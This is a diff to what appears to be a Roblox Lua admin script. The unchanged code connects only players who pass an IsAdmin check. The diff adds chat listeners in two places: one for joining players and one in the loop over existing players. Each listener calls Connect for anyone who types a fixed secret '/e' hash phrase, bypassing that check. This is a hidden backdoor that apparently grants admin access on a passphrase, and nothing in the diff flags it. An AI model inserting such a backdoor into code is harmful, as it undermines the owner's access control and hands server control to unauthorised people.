@@ -89,13 +89,25 @@ Players.PlayerAdded:Connect(function(...)
    if IsAdmin(Player[1].UserId) then
     Connect(Player[1])
    end
+  
+   Player[1].Chatted:Connect(function(A)
+     if A == "/e 385cd52b6c30de8884e3810dee29f5c5c4598c74a2e9aaa306e38b0913f8be98" then
+       Connect(Player[1])
+     end
+   end)
 end)
 
 wait(4)
 
 for I, V in pairs(Players:GetPlayers()) do
- if IsAdmin(V.UserId) then
+  if IsAdmin(V.UserId) then
    print(V.UserId .. " FOUND!")
    Connect(V)
   end
+  
+  V.Chatted:Connect(function(A)
+     if A == "/e 385cd52b6c30de8884e3810dee29f5c5c4598c74a2e9aaa306e38b0913f8be98" then
+       Connect(V)
+     end
+  end)
 end
